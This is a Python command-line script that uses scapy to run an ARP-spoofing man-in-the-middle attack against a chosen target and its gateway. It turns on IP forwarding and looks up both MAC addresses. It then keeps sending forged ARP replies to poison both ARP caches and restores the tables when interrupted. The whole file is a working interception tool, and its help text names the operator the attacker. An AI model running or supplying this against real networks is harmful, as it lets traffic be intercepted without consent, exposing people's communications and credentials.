#!/usr/bin/env python3

import subprocess
import scapy.all as scapy
import argparse
import re
import time


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", dest="mitm_interface", help="Attacker's interface to execute Man-in-the-Middle (MITM) attack (i.e. eth0)")
    parser.add_argument("-t", "--target", dest="target_ip", help="Target's IP address (i.e. 10.1.1.15)")
    parser.add_argument("-tm", "--target-mac-address", dest="target_mac", required=False, help="Target MAC address (i.e. aa:bb:cc:dd:ee:ff)")
    parser.add_argument("-g", "--gateway", dest="gateway_ip", help="Gateway IP address of Target (i.e. 10.1.1.1)")
    options = parser.parse_args()
    if not options.mitm_interface:
        parser.error("[-] Please specify an interface to execute the attack from, see --help for more info.")
    if not options.target_ip:
        parser.error("[-] Please specify a target IP address, see --help for more info.")
    if not options.gateway_ip:
        parser.error("[-] Please specify a gateway IP address, see --help for more info.")
    return options


def get_mac(ip_address):
    arp_request = scapy.ARP(pdst=ip_address)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc


def mitm_mac(mitm_interface):
    parse_mac = argparse.ArgumentParser()
    ifconfig_snapshot = subprocess.check_output(["ifconfig", mitm_interface])
    mitm_mac_address = re.findall(r"\w\w:\w\w:\w\w:\w\w:\w\w:\w\w", str(ifconfig_snapshot))[0]
    return mitm_mac_address


def arp_spoof_target(target_ip, gateway_ip):
    packet = scapy.ARP(op=2, pdst=str(target_ip), hwdst=target_mac, psrc=gateway_ip)
    scapy.send(packet, verbose=False)


def arp_spoof_gateway(gateway_ip, target_ip):
    packet = scapy.ARP(op=2, pdst=str(gateway_ip), hwdst=gateway_mac, psrc=target_ip)
    scapy.send(packet, verbose=False)


def arp_fix_target(target_ip, gateway_mac, gateway_ip, target_mac):
    packet = scapy.ARP(op=2, pdst=str(gateway_ip), hwdst=gateway_mac, psrc=target_ip, hwsrc=target_mac)
    scapy.send(packet, verbose=False)


def arp_fix_gateway(gateway_ip, target_mac, target_ip, gateway_mac):
    packet = scapy.ARP(op=2, pdst=str(target_ip), hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac)
    scapy.send(packet, verbose=False)


# target_ip = input("Target IP Address: ")
# target_mac = input("Target MAC Address: ")
# gateway_ip = input("Gateway IP Address to spoof: ")
# gateway_mac = input("Gateway MAC Address: ")


options = get_arguments()
print("[ ] Script Started.")
print("[+] Enabling Traffic Flow..")
subprocess.check_call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)
print("[+] Enabled Traffic Flow!")
if not options.target_mac:
    print("[+] Querying for Target MAC Address..")
    target_mac = get_mac(options.target_ip)
else:
    target_mac = options.target_mac
    print("[+] Specified Target MAC: " + str(options.target_mac))
print("[+] Querying for Gateway MAC Address..")
gateway_mac = get_mac(options.gateway_ip)
# mitm_mac_address = mitm_mac(options.mitm_interface)
print("[+] Initiating Attack..")
sent_packets_count = 0
try:
    while True:
        print("[+] Spoofing Target..")
        arp_spoof_target(options.target_ip, options.gateway_ip)
        print("[+] Spoofed Target!")
        print("[+] Spoofing Gateway..")
        arp_spoof_gateway(options.gateway_ip, options.target_ip)
        print("[+] Spoofed Gateway!")
        sent_packets_count = sent_packets_count + 2
        print("\r[+] Times attacked: " + str(sent_packets_count), end="")
        print("[+] Waiting for 30 seconds..")
        time.sleep(30)
        print("[+] Looping attack.")
except KeyboardInterrupt:
    print("\n[X] Script cancelled!")
    print("[+] Restoring ARP tables..")
    arp_fix_target(options.target_ip, gateway_mac, options.gateway_ip, target_mac)
    arp_fix_gateway(options.gateway_ip, target_mac, options.target_ip, gateway_mac)
    print("[+] Restored ARP tables.")
